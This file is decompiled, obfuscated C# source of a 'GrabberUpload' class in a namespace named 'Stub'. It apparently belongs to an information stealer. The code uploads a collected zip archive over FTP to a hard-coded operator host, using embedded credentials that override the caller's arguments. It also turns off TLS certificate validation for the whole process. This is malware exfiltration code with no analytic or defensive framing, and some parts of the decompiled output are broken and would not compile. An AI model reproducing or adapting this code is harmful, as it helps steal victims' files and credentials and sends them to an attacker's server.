using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x0200004F RID: 79
	internal sealed class GrabberUpload
	{
		// Token: 0x06000176 RID: 374 RVA: 0x00012E14 File Offset: 0x00011014
		public static async Task UploadFileToGrabberFtpAsync(string ftpHost, string ftpUsername, string ftpPassword, string zipFilePath, bool useSsl = true, bool usePassive = true)
		{
			FtpWebResponse response2;
			object obj;
			WebException ex3;
			bool flag;
			WebException ex;
			try
			{
				if (useSsl)
				{
					ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(GrabberUpload.IgnoreCertificateValidation);
				}
				ftpHost = Config.GrabberHost;
				ftpUsername = Config.GrabberUser;
				ftpPassword = Config.GrabberPass;
				string fileName = Path.GetFileName(zipFilePath);
				string ftpUri = "ftp://" + ftpHost + "/" + fileName;
				FtpWebRequest request = (FtpWebRequest)WebRequest.Create(ftpUri);
				request.Method = "STOR";
				request.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
				request.EnableSsl = useSsl;
				request.UsePassive = usePassive;
				request.KeepAlive = false;
				request.Timeout = 30000;
				request.ReadWriteTimeout = 30000;
				using (FileStream fileStream = File.OpenRead(zipFilePath))
				{
					Stream stream = await request.GetRequestStreamAsync().ConfigureAwait(false);
					Stream requestStream = stream;
					stream = null;
					try
					{
						byte[] buffer = new byte[65536];
						for (;;)
						{
							ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter configuredTaskAwaiter = fileStream.ReadAsync(buffer, 0, buffer.Length).ConfigureAwait(false).GetAwaiter();
							if (!configuredTaskAwaiter.IsCompleted)
							{
								await configuredTaskAwaiter;
								ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter configuredTaskAwaiter2;
								configuredTaskAwaiter = configuredTaskAwaiter2;
								configuredTaskAwaiter2 = default(ConfiguredTaskAwaitable<int>.ConfiguredTaskAwaiter);
							}
							int result = configuredTaskAwaiter.GetResult();
							int bytesRead;
							if ((bytesRead = result) <= 0)
							{
								break;
							}
							ConfiguredTaskAwaitable.ConfiguredTaskAwaiter configuredTaskAwaiter3 = requestStream.WriteAsync(buffer, 0, bytesRead).ConfigureAwait(false).GetAwaiter();
							if (!configuredTaskAwaiter3.IsCompleted)
							{
								await configuredTaskAwaiter3;
								ConfiguredTaskAwaitable.ConfiguredTaskAwaiter configuredTaskAwaiter4;
								configuredTaskAwaiter3 = configuredTaskAwaiter4;
								configuredTaskAwaiter4 = default(ConfiguredTaskAwaitable.ConfiguredTaskAwaiter);
							}
							configuredTaskAwaiter3.GetResult();
						}
						buffer = null;
					}
					finally
					{
						if (requestStream != null)
						{
							((IDisposable)requestStream).Dispose();
						}
					}
					requestStream = null;
				}
				FileStream fileStream = null;
				ConfiguredTaskAwaitable<WebResponse>.ConfiguredTaskAwaiter configuredTaskAwaiter5 = request.GetResponseAsync().ConfigureAwait(false).GetAwaiter();
				if (!configuredTaskAwaiter5.IsCompleted)
				{
					await configuredTaskAwaiter5;
					ConfiguredTaskAwaitable<WebResponse>.ConfiguredTaskAwaiter configuredTaskAwaiter6;
					configuredTaskAwaiter5 = configuredTaskAwaiter6;
					configuredTaskAwaiter6 = default(ConfiguredTaskAwaitable<WebResponse>.ConfiguredTaskAwaiter);
				}
				WebResponse webResponse = configuredTaskAwaiter5.GetResult();
				FtpWebResponse response = (FtpWebResponse)webResponse;
				webResponse = null;
				try
				{
					Logging.Log("Upload to FTP complete, status: " + response.StatusDescription, true);
				}
				finally
				{
					if (response != null)
					{
						((IDisposable)response).Dispose();
					}
				}
				response = null;
				fileName = null;
				ftpUri = null;
				request = null;
			}
			catch when (delegate
			{
				// Failed to create a 'catch-when' expression
				ex3 = obj as WebException;
				if (ex3 == null)
				{
					flag = false;
				}
				else
				{
					ex = ex3;
					response2 = ex.Response as FtpWebResponse;
					flag = (response2 != null) > false;
				}
				endfilter(flag);
			})
			{
				Logging.Log(string.Format("FTP Error: {0} - {1}", response2.StatusCode, response2.StatusDescription), true);
				throw;
			}
			catch (Exception ex2)
			{
				Logging.Log("General Error: " + ex2.Message, true);
				throw;
			}
		}

		// Token: 0x06000177 RID: 375 RVA: 0x0000F58C File Offset: 0x0000D78C
		private static bool IgnoreCertificateValidation(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return true;
		}

		// Token: 0x06000178 RID: 376 RVA: 0x000038B4 File Offset: 0x00001AB4
		public GrabberUpload()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000179 RID: 377 RVA: 0x000038AD File Offset: 0x00001AAD
		static GrabberUpload()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}
	}
}
